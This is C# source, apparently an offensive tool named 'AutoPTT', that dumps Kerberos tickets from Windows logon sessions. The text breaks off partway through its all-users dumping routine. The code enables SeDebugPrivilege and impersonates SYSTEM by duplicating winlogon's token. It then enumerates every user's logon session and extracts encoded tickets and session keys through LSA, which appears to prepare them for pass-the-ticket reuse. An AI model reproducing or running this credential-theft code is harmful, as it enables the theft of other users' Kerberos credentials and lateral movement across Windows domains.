using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;


namespace AutoPTT
{
    class Program
    {
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        const uint TOKEN_STATISTICS_INFO_CLASS = 10;
        const uint SE_PRIVILEGE_ENABLED = 0x00000002;
        const string SE_DEBUG_NAME = "SeDebugPrivilege";
        const uint SecurityImpersonation = 2;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint TH32CS_SNAPPROCESS = 0x00000002;
        const uint KerbQueryTicketCacheMessage = 1;
        const uint KerbRetrieveEncodedTicketMessage = 8;
        const uint KerbQueryTicketCacheExMessage = 14;
        const uint KerbSubmitTicketMessage = 21;
        const uint KERB_RETRIEVE_TICKET_AS_KERB_CRED = 0x8;
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint MAXIMUM_ALLOWED = 0x02000000;
        const uint TokenImpersonation = 2;

        static readonly Dictionary<uint, string> LogonTypeNames = new Dictionary<uint, string>
        {
            {0, "Unknown"}, {2, "Interactive"}, {3, "Network"}, {4, "Batch"}, {5, "Service"},
            {7, "Unlock"}, {8, "NetworkCleartext"}, {9, "NewCredentials"}, 
            {10, "RemoteInteractive"}, {11, "CachedInteractive"}
        };

        static readonly Dictionary<int, string> EncryptionTypes = new Dictionary<int, string>
        {
            {1, "DES-CBC-CRC"}, {3, "DES-CBC-MD5"}, {17, "AES-128-CTS-HMAC-SHA1-96"},
            {18, "AES-256-CTS-HMAC-SHA1-96"}, {23, "RC4-HMAC"}, {24, "RC4-HMAC-EXP"}
        };

        static List<TgtInfo> g_tgtList = new List<TgtInfo>();


        class TgtInfo
        {
            public uint LogonId;
            public string Username;
            public string Domain;
            public string ServiceName;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct LUID
        {
            public uint LowPart;
            public int HighPart;

            public LUID(uint low, int high)
            {
                LowPart = low;
                HighPart = high;
            }
        }


        [StructLayout(LayoutKind.Sequential)]
        struct LARGE_INTEGER
        {
            public long QuadPart;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct LSA_UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct LSA_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_LOGON_SESSION_DATA
        {
            public uint Size;
            public LUID LogonId;
            public LSA_UNICODE_STRING UserName;
            public LSA_UNICODE_STRING LogonDomain;
            public LSA_UNICODE_STRING AuthenticationPackage;
            public uint LogonType;
            public uint Session;
            public IntPtr Sid;
            public LARGE_INTEGER LogonTime;
            public LSA_UNICODE_STRING LogonServer;
            public LSA_UNICODE_STRING DnsDomainName;
            public LSA_UNICODE_STRING Upn;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_STATISTICS
        {
            public LUID TokenId;
            public LUID AuthenticationId;
            public LARGE_INTEGER ExpirationTime;
            public uint TokenType;
            public uint ImpersonationLevel;
            public uint DynamicCharged;
            public uint DynamicAvailable;
            public uint GroupCount;
            public uint PrivilegeCount;
            public LUID ModifiedId;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_QUERY_TKT_CACHE_REQUEST
        {
            public uint MessageType;
            public LUID LogonId;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_QUERY_TKT_CACHE_RESPONSE
        {
            public uint MessageType;
            public uint CountOfTickets;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_TICKET_CACHE_INFO
        {
            public LSA_UNICODE_STRING ServerName;
            public LSA_UNICODE_STRING RealmName;
            public LARGE_INTEGER StartTime;
            public LARGE_INTEGER EndTime;
            public LARGE_INTEGER RenewTime;
            public int EncryptionType;
            public uint TicketFlags;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_TICKET_CACHE_INFO_EX
        {
            public LSA_UNICODE_STRING ClientName;
            public LSA_UNICODE_STRING ClientRealm;
            public LSA_UNICODE_STRING ServerName;
            public LSA_UNICODE_STRING ServerRealm;
            public LARGE_INTEGER StartTime;
            public LARGE_INTEGER EndTime;
            public LARGE_INTEGER RenewTime;
            public int EncryptionType;
            public uint TicketFlags;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
            public LUID_AND_ATTRIBUTES[] Privileges;
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct PROCESSENTRY32W
        {
            public uint dwSize;
            public uint cntUsage;
            public uint th32ProcessID;
            public IntPtr th32DefaultHeapID;
            public uint th32ModuleID;
            public uint cntThreads;
            public uint th32ParentProcessID;
            public int pcPriClassBase;
            public uint dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExeFile;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_CRYPTO_KEY
        {
            public int KeyType;
            public uint Length;
            public IntPtr Value;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_EXTERNAL_NAME
        {
            public short NameType;
            public ushort NameCount;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_EXTERNAL_TICKET
        {
            public IntPtr ServiceName;
            public IntPtr TargetName;
            public IntPtr ClientName;
            public LSA_UNICODE_STRING DomainName;
            public LSA_UNICODE_STRING TargetDomainName;
            public LSA_UNICODE_STRING AltTargetDomainName;
            public KERB_CRYPTO_KEY SessionKey;
            public uint TicketFlags;
            public uint Flags;
            public LARGE_INTEGER KeyExpirationTime;
            public LARGE_INTEGER StartTime;
            public LARGE_INTEGER EndTime;
            public LARGE_INTEGER RenewUntil;
            public LARGE_INTEGER TimeSkew;
            public int EncodedTicketSize;
            public IntPtr EncodedTicket;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_RETRIEVE_TKT_RESPONSE
        {
            public KERB_EXTERNAL_TICKET Ticket;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_HANDLE
        {
            public IntPtr LowPart;
            public IntPtr HighPart;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_RETRIEVE_TKT_REQUEST
        {
            public uint MessageType;
            public LUID LogonId;
            public LSA_UNICODE_STRING TargetName;
            public uint TicketFlags;
            public uint CacheOptions;
            public int EncryptionType;
            public SECURITY_HANDLE CredentialsHandle;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_CRYPTO_KEY32
        {
            public int KeyType;
            public uint Length;
            public uint Offset;
        }


        [StructLayout(LayoutKind.Sequential)]
        struct KERB_SUBMIT_TKT_REQUEST
        {
            public uint MessageType;
            public LUID LogonId;
            public uint Flags;
            public KERB_CRYPTO_KEY32 Key;
            public uint KerbCredSize;
            public uint KerbCredOffset;
        }


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaConnectUntrusted(out IntPtr lsaHandle);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaLookupAuthenticationPackage(IntPtr lsaHandle, ref LSA_STRING packageName, 
            out uint authenticationPackage);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaCallAuthenticationPackage(IntPtr lsaHandle, uint authenticationPackage, 
            IntPtr protocolSubmitBuffer, uint submitBufferLength, out IntPtr protocolReturnBuffer, 
            out uint returnBufferLength, out int protocolStatus);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaFreeReturnBuffer(IntPtr buffer);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaEnumerateLogonSessions(out uint logonSessionCount, out IntPtr logonSessionList);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaGetLogonSessionData(ref LUID logonId, out IntPtr ppLogonSessionData);


        [DllImport("secur32.dll", SetLastError = false)]
        static extern int LsaDeregisterLogonProcess(IntPtr lsaHandle);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr tokenHandle, uint tokenInformationClass, 
            IntPtr tokenInformation, uint tokenInformationLength, out uint returnLength);


        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool AdjustTokenPrivileges(IntPtr tokenHandle, bool disableAllPrivileges, 
            ref TOKEN_PRIVILEGES newState, uint bufferLength, IntPtr previousState, IntPtr returnLength);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateToken(IntPtr existingTokenHandle, uint impersonationLevel, 
            out IntPtr duplicateTokenHandle);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, 
            IntPtr lpTokenAttributes, uint impersonationLevel, uint tokenType, out IntPtr phNewToken);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);


        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();


        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);


        [DllImport("kernel32.dll")]
        static extern uint GetLastError();


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool inheritHandle, uint processId);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);


        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);


        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32W lppe);


        [DllImport("shell32.dll", SetLastError = true)]
        static extern bool IsUserAnAdmin();


        static string UnicodeStringToString(LSA_UNICODE_STRING unicodeString)
        {
            if (unicodeString.Length == 0 || unicodeString.Buffer == IntPtr.Zero)
                return "";

            try
            {
                int length = unicodeString.Length / 2;
                return Marshal.PtrToStringUni(unicodeString.Buffer, length);
            }
            catch
            {
                return "";
            }
        }


        static DateTime FiletimeToDateTime(LARGE_INTEGER largeInt)
        {
            if (largeInt.QuadPart == 0)
                return new DateTime(1601, 1, 1);

            try
            {
                return DateTime.FromFileTime(largeInt.QuadPart);
            }
            catch
            {
                return new DateTime(1601, 1, 1);
            }
        }


        static string FormatTicketFlags(uint flags)
        {
            List<string> flagNames = new List<string>();

            if ((flags & 0x40000000) != 0) flagNames.Add("forwardable");
            if ((flags & 0x20000000) != 0) flagNames.Add("forwarded");
            if ((flags & 0x10000000) != 0) flagNames.Add("proxiable");
            if ((flags & 0x08000000) != 0) flagNames.Add("proxy");
            if ((flags & 0x04000000) != 0) flagNames.Add("may_postdate");
            if ((flags & 0x02000000) != 0) flagNames.Add("postdated");
            if ((flags & 0x01000000) != 0) flagNames.Add("invalid");
            if ((flags & 0x00800000) != 0) flagNames.Add("renewable");
            if ((flags & 0x00400000) != 0) flagNames.Add("initial");
            if ((flags & 0x00200000) != 0) flagNames.Add("pre_authent");
            if ((flags & 0x00100000) != 0) flagNames.Add("hw_authent");
            if ((flags & 0x00040000) != 0) flagNames.Add("ok_as_delegate");
            if ((flags & 0x00010000) != 0) flagNames.Add("name_canonicalize");

            return flagNames.Count > 0 ? string.Join(" ", flagNames) : "0";
        }


        static bool EnableDebugPrivilege()
        {
            IntPtr hToken;
            IntPtr hProcess = GetCurrentProcess();

            if (!OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))
                return false;

            LUID luid;
            if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, out luid))
            {
                CloseHandle(hToken);
                return false;
            }

            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
            tp.PrivilegeCount = 1;
            tp.Privileges = new LUID_AND_ATTRIBUTES[1];
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (!AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
            {
                CloseHandle(hToken);
                return false;
            }

            uint error = GetLastError();
            CloseHandle(hToken);

            if (error == 1300)
                return false;

            Console.WriteLine("[+] SeDebugPrivilege enabled successfully");
            return true;
        }


        static LUID? GetCurrentLogonId()
        {
            IntPtr hToken;
            IntPtr hProcess = GetCurrentProcess();

            if (!OpenProcessToken(hProcess, TOKEN_QUERY, out hToken))
                return null;

            TOKEN_STATISTICS stats = new TOKEN_STATISTICS();
            uint returnLength;
            IntPtr statsPtr = Marshal.AllocHGlobal(Marshal.SizeOf(stats));

            bool success = GetTokenInformation(hToken, TOKEN_STATISTICS_INFO_CLASS, statsPtr, 
                (uint)Marshal.SizeOf(stats), out returnLength);

            if (success)
                stats = (TOKEN_STATISTICS)Marshal.PtrToStructure(statsPtr, typeof(TOKEN_STATISTICS));

            Marshal.FreeHGlobal(statsPtr);
            CloseHandle(hToken);

            if (!success)
                return null;

            return stats.AuthenticationId;
        }


        static void PrintCurrentLogonId()
        {
            LUID? logonId = GetCurrentLogonId();
            if (logonId.HasValue)
            {
                LUID luid = logonId.Value;
                Console.WriteLine($"Current LogonId is {luid.HighPart}:0x{luid.LowPart:x}");
            }
        }


        static uint GetProcessIdOfName(string processName)
        {
            IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnapshot == new IntPtr(-1))
                return 0;

            PROCESSENTRY32W pe = new PROCESSENTRY32W();
            pe.dwSize = (uint)Marshal.SizeOf(typeof(PROCESSENTRY32W));

            if (!Process32First(hSnapshot, ref pe))
            {
                CloseHandle(hSnapshot);
                return 0;
            }

            do
            {
                if (pe.szExeFile.Equals(processName, StringComparison.OrdinalIgnoreCase))
                {
                    CloseHandle(hSnapshot);
                    return pe.th32ProcessID;
                }
            } while (Process32Next(hSnapshot, ref pe));

            CloseHandle(hSnapshot);
            return 0;
        }


        static bool GetSystem()
        {
            uint winlogonPid = GetProcessIdOfName("winlogon.exe");
            if (winlogonPid == 0)
                return false;

            IntPtr hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, winlogonPid);
            if (hProcess == IntPtr.Zero)
                return false;

            IntPtr hToken;
            if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, out hToken))
            {
                CloseHandle(hProcess);
                return false;
            }

            IntPtr hDupToken;
            if (!DuplicateToken(hToken, SecurityImpersonation, out hDupToken))
            {
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return false;
            }

            if (!ImpersonateLoggedOnUser(hDupToken))
            {
                CloseHandle(hDupToken);
                CloseHandle(hToken);
                CloseHandle(hProcess);
                return false;
            }

            CloseHandle(hToken);
            CloseHandle(hDupToken);
            CloseHandle(hProcess);
            return true;
        }


        static IntPtr GetLsaHandleWithImpersonation()
        {
            bool isAdmin = IsUserAnAdmin();

            if (isAdmin)
            {
                if (!GetSystem())
                    return IntPtr.Zero;

                IntPtr lsaHandle;
                int status = LsaConnectUntrusted(out lsaHandle);
                RevertToSelf();

                if (status != 0)
                    return IntPtr.Zero;

                return lsaHandle;
            }
            else
            {
                IntPtr lsaHandle;
                int status = LsaConnectUntrusted(out lsaHandle);

                if (status != 0)
                    return IntPtr.Zero;

                return lsaHandle;
            }
        }


        static (byte[], byte[], int) RequestServiceTicket(IntPtr lsaHandle, uint authPack, LUID userLogonId, 
            string targetName, uint ticketFlags)
        {
            try
            {
                byte[] targetNameBytes = System.Text.Encoding.Unicode.GetBytes(targetName);
                int structSize = Marshal.SizeOf(typeof(KERB_RETRIEVE_TKT_REQUEST));
                int totalSize = structSize + targetNameBytes.Length + 2;

                IntPtr requestPtr = Marshal.AllocHGlobal(totalSize);

                KERB_RETRIEVE_TKT_REQUEST request = new KERB_RETRIEVE_TKT_REQUEST();
                request.MessageType = KerbRetrieveEncodedTicketMessage;
                request.LogonId = userLogonId;
                request.TargetName = new LSA_UNICODE_STRING();
                request.TargetName.Length = (ushort)targetNameBytes.Length;
                request.TargetName.MaximumLength = (ushort)(targetNameBytes.Length + 2);
                request.TargetName.Buffer = new IntPtr(requestPtr.ToInt64() + structSize);
                request.TicketFlags = ticketFlags;
                request.CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
                request.EncryptionType = 0;
                request.CredentialsHandle = new SECURITY_HANDLE();

                Marshal.StructureToPtr(request, requestPtr, false);
                Marshal.Copy(targetNameBytes, 0, new IntPtr(requestPtr.ToInt64() + structSize), targetNameBytes.Length);

                IntPtr responsePtr;
                uint responseSize;
                int protocolStatus;

                int status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr, (uint)totalSize, 
                    out responsePtr, out responseSize, out protocolStatus);

                Marshal.FreeHGlobal(requestPtr);

                if (status != 0 || protocolStatus != 0 || responseSize == 0)
                    return (null, null, 0);

                KERB_RETRIEVE_TKT_RESPONSE response = (KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure(responsePtr, 
                    typeof(KERB_RETRIEVE_TKT_RESPONSE));

                byte[] ticketBytes = null;
                byte[] sessionKeyBytes = null;
                int keyType = 0;

                if (response.Ticket.EncodedTicketSize > 0 && response.Ticket.EncodedTicket != IntPtr.Zero)
                {
                    ticketBytes = new byte[response.Ticket.EncodedTicketSize];
                    Marshal.Copy(response.Ticket.EncodedTicket, ticketBytes, 0, response.Ticket.EncodedTicketSize);
                }

                if (response.Ticket.SessionKey.Length > 0 && response.Ticket.SessionKey.Value != IntPtr.Zero)
                {
                    sessionKeyBytes = new byte[response.Ticket.SessionKey.Length];
                    Marshal.Copy(response.Ticket.SessionKey.Value, sessionKeyBytes, 0, 
                        (int)response.Ticket.SessionKey.Length);
                    keyType = response.Ticket.SessionKey.KeyType;
                }

                LsaFreeReturnBuffer(responsePtr);

                return (ticketBytes, sessionKeyBytes, keyType);
            }
            catch
            {
                return (null, null, 0);
            }
        }


        static void EnumerateLogonSessions()
        {
            uint sessionCount;
            IntPtr sessionList;

            int status = LsaEnumerateLogonSessions(out sessionCount, out sessionList);
            if (status != 0)
            {
                Console.WriteLine($"[-] LsaEnumerateLogonSessions failed with status 0x{status:X8}");
                return;
            }

            Console.WriteLine();

            for (int i = 0; i < sessionCount; i++)
            {
                IntPtr currentPtr = new IntPtr(sessionList.ToInt64() + i * Marshal.SizeOf(typeof(LUID)));
                LUID sessionLuid = (LUID)Marshal.PtrToStructure(currentPtr, typeof(LUID));

                IntPtr sessionDataPtr;
                status = LsaGetLogonSessionData(ref sessionLuid, out sessionDataPtr);

                if (status != 0 || sessionDataPtr == IntPtr.Zero)
                    continue;

                SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(
                    sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));

                string domain = UnicodeStringToString(sessionData.LogonDomain);
                string username = UnicodeStringToString(sessionData.UserName);
                string authPackage = UnicodeStringToString(sessionData.AuthenticationPackage);
                uint logonType = sessionData.LogonType;
                string logonTypeStr = LogonTypeNames.ContainsKey(logonType) ? 
                    LogonTypeNames[logonType] : $"({logonType})";

                Console.WriteLine($"[{i}] Session {sessionData.Session} {sessionLuid.HighPart}:0x{sessionLuid.LowPart:x} " +
                    $"{domain}\\{username} {authPackage}:{logonTypeStr}");

                LsaFreeReturnBuffer(sessionDataPtr);
            }

            LsaFreeReturnBuffer(sessionList);
        }


        static void EnumerateMyTickets()
        {
            IntPtr lsaHandle;
            int status = LsaConnectUntrusted(out lsaHandle);
            if (status != 0)
            {
                Console.WriteLine($"[-] LsaConnectUntrusted failed: 0x{status:X8}");
                return;
            }

            LSA_STRING pkgName = new LSA_STRING();
            byte[] pkgNameBytes = System.Text.Encoding.ASCII.GetBytes("Kerberos");
            IntPtr pkgNamePtr = Marshal.AllocHGlobal(pkgNameBytes.Length);
            Marshal.Copy(pkgNameBytes, 0, pkgNamePtr, pkgNameBytes.Length);
            pkgName.Buffer = pkgNamePtr;
            pkgName.Length = (ushort)pkgNameBytes.Length;
            pkgName.MaximumLength = (ushort)(pkgNameBytes.Length + 1);

            uint authPack;
            status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPack);
            Marshal.FreeHGlobal(pkgNamePtr);

            if (status != 0)
            {
                Console.WriteLine($"[-] Failed to find Kerberos package: 0x{status:X8}");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            KERB_QUERY_TKT_CACHE_REQUEST cacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();
            cacheRequest.MessageType = KerbQueryTicketCacheMessage;
            cacheRequest.LogonId = new LUID(0, 0);

            IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest));
            Marshal.StructureToPtr(cacheRequest, requestPtr, false);

            IntPtr responsePtr;
            uint responseSize;
            int protocolStatus;

            status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr, 
                (uint)Marshal.SizeOf(cacheRequest), out responsePtr, out responseSize, out protocolStatus);

            Marshal.FreeHGlobal(requestPtr);

            if (status != 0 || protocolStatus != 0 || responsePtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to query ticket cache");
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(
                responsePtr, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
            uint ticketCount = cacheResponse.CountOfTickets;

            Console.WriteLine($"Cached Tickets: ({ticketCount})\n");

            if (ticketCount == 0)
            {
                LsaFreeReturnBuffer(responsePtr);
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            LUID? logonId = GetCurrentLogonId();
            string username = "unknown";

            if (logonId.HasValue)
            {
                LUID luid = logonId.Value;
                IntPtr sessionDataPtr;
                if (LsaGetLogonSessionData(ref luid, out sessionDataPtr) == 0 && sessionDataPtr != IntPtr.Zero)
                {
                    SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(
                        sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));
                    username = UnicodeStringToString(sessionData.UserName);
                    LsaFreeReturnBuffer(sessionDataPtr);
                }
            }

            int ticketsOffset = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

            try
            {
                for (int i = 0; i < ticketCount; i++)
                {
                    IntPtr ticketAddr = new IntPtr(responsePtr.ToInt64() + ticketsOffset + 
                        i * Marshal.SizeOf(typeof(KERB_TICKET_CACHE_INFO)));
                    KERB_TICKET_CACHE_INFO ticket = (KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(ticketAddr, 
                        typeof(KERB_TICKET_CACHE_INFO));

                    string serverName = UnicodeStringToString(ticket.ServerName);
                    string realmName = UnicodeStringToString(ticket.RealmName);
                    DateTime startTime = FiletimeToDateTime(ticket.StartTime);
                    DateTime endTime = FiletimeToDateTime(ticket.EndTime);
                    DateTime renewTime = FiletimeToDateTime(ticket.RenewTime);
                    string encType = EncryptionTypes.ContainsKey(ticket.EncryptionType) ? 
                        EncryptionTypes[ticket.EncryptionType] : $"Unknown ({ticket.EncryptionType})";
                    string flagsStr = FormatTicketFlags(ticket.TicketFlags);

                    Console.WriteLine($"#{i}>     Client: {username} @ {realmName}");
                    Console.WriteLine($"        Server: {serverName} @ {realmName}");
                    Console.WriteLine($"        KerbTicket Encryption Type: {encType}");
                    Console.WriteLine($"        Ticket Flags 0x{ticket.TicketFlags:x} -> {flagsStr}");
                    Console.WriteLine($"        Start Time: {startTime:MM/dd/yyyy HH:mm:ss} (local)");
                    Console.WriteLine($"        End Time:   {endTime:MM/dd/yyyy HH:mm:ss} (local)");
                    Console.WriteLine($"        Renew Time: {renewTime:MM/dd/yyyy HH:mm:ss} (local)");

                    var result = RequestServiceTicket(lsaHandle, authPack, new LUID(0, 0), serverName, 
                        ticket.TicketFlags);

                    if (result.Item2 != null)
                    {
                        string keyEncType = EncryptionTypes.ContainsKey(result.Item3) ? 
                            EncryptionTypes[result.Item3] : $"Unknown ({result.Item3})";
                        Console.WriteLine($"        Session Key Type: {keyEncType}");
                    }

                    Console.WriteLine($"        Cache Flags: 0x1 -> PRIMARY");
                    Console.WriteLine($"        Kdc Called:\n");
                }
            }
            catch { }

            LsaFreeReturnBuffer(responsePtr);
            LsaDeregisterLogonProcess(lsaHandle);
        }


        static void EnumerateAllTickets()
        {
            Console.WriteLine("[*] Action: Dump Kerberos Ticket Data (All Users)\n");

            LUID? currentLuid = GetCurrentLogonId();
            if (currentLuid.HasValue)
            {
                LUID luid = currentLuid.Value;
                ulong combined = ((ulong)luid.HighPart << 32) | luid.LowPart;
                Console.WriteLine($"[*] Current LUID    : 0x{combined:x}\n");
            }

            EnableDebugPrivilege();

            IntPtr lsaHandle = GetLsaHandleWithImpersonation();
            if (lsaHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get LSA handle");
                return;
            }

            LSA_STRING pkgName = new LSA_STRING();
            byte[] pkgNameBytes = System.Text.Encoding.ASCII.GetBytes("Kerberos");
            IntPtr pkgNamePtr = Marshal.AllocHGlobal(pkgNameBytes.Length);
            Marshal.Copy(pkgNameBytes, 0, pkgNamePtr, pkgNameBytes.Length);
            pkgName.Buffer = pkgNamePtr;
            pkgName.Length = (ushort)pkgNameBytes.Length;
            pkgName.MaximumLength = (ushort)(pkgNameBytes.Length + 1);

            uint authPack;
            int status = LsaLookupAuthenticationPackage(lsaHandle, ref pkgName, out authPack);
            Marshal.FreeHGlobal(pkgNamePtr);

            if (status != 0)
            {
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            uint sessionCount;
            IntPtr sessionList;
            status = LsaEnumerateLogonSessions(out sessionCount, out sessionList);
            if (status != 0)
            {
                LsaDeregisterLogonProcess(lsaHandle);
                return;
            }

            int totalSessions = 0;
            int sessionsWithTickets = 0;
            int totalTickets = 0;
            int tgtCount = 0;
            int serviceCount = 0;

            for (int i = 0; i < sessionCount; i++)
            {
                IntPtr currentPtr = new IntPtr(sessionList.ToInt64() + i * Marshal.SizeOf(typeof(LUID)));
                LUID sessionLuid = (LUID)Marshal.PtrToStructure(currentPtr, typeof(LUID));

                IntPtr sessionDataPtr;
                status = LsaGetLogonSessionData(ref sessionLuid, out sessionDataPtr);

                if (status != 0 || sessionDataPtr == IntPtr.Zero)
                    continue;

                SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(
                    sessionDataPtr, typeof(SECURITY_LOGON_SESSION_DATA));

                string username = UnicodeStringToString(sessionData.UserName);
                string domain = UnicodeStringToString(sessionData.LogonDomain);

                if (string.IsNullOrEmpty(username))
                {
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                totalSessions++;

                KERB_QUERY_TKT_CACHE_REQUEST cacheRequest = new KERB_QUERY_TKT_CACHE_REQUEST();
                cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
                cacheRequest.LogonId = sessionLuid;

                IntPtr requestPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheRequest));
                Marshal.StructureToPtr(cacheRequest, requestPtr, false);

                IntPtr responsePtr;
                uint responseSize;
                int protocolStatus;

                status = LsaCallAuthenticationPackage(lsaHandle, authPack, requestPtr, 
                    (uint)Marshal.SizeOf(cacheRequest), out responsePtr, out responseSize, out protocolStatus);

                Marshal.FreeHGlobal(requestPtr);

                if (status != 0 || protocolStatus != 0 || responsePtr == IntPtr.Zero)
                {
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                KERB_QUERY_TKT_CACHE_RESPONSE cacheResponse = (KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure(
                    responsePtr, typeof(KERB_QUERY_TKT_CACHE_RESPONSE));
                uint ticketCount = cacheResponse.CountOfTickets;

                if (ticketCount == 0)
                {
                    LsaFreeReturnBuffer(responsePtr);
                    LsaFreeReturnBuffer(sessionDataPtr);
                    continue;
                }

                sessionsWithTickets++;
                totalTickets += (int)ticketCount;

                string authPackage = UnicodeStringToString(sessionData.AuthenticationPackage);
                string logonType = LogonTypeNames.ContainsKey(sessionData.LogonType) ? 
                    LogonTypeNames[sessionData.LogonType] : "Unknown";
                DateTime logonTime = FiletimeToDateTime(sessionData.LogonTime);
                string logonServer = UnicodeStringToString(sessionData.LogonServer);
                string dnsDomain = UnicodeStringToString(sessionData.DnsDomainName);
                string upn = UnicodeStringToString(sessionData.Upn);

                Console.WriteLine($"  UserName                 : {username}");
                Console.WriteLine($"  Domain                   : {domain}");
                Console.WriteLine($"  LogonId                  : 0x{sessionLuid.LowPart:x}");
                Console.WriteLine($"  UserSID                  : [SID]");
                Console.WriteLine($"  AuthenticationPackage    : {authPackage}");
                Console.WriteLine($"  LogonType                : {logonType}");
                Console.WriteLine($"  LogonTime                : {logonTime:MM/dd/yyyy HH:mm:ss}");
                Console.WriteLine($"  LogonServer              : {logonServer}");
                Console.WriteLine($"  LogonServerDNSDomain     : {dnsDomain}");
                Console.WriteLine($"  UserPrincipalName        : {upn}");
                Console.WriteLine();

                int ticketsOffset = Marshal.SizeOf(typeof(KERB_QUERY_TKT_CACHE_RESPONSE));

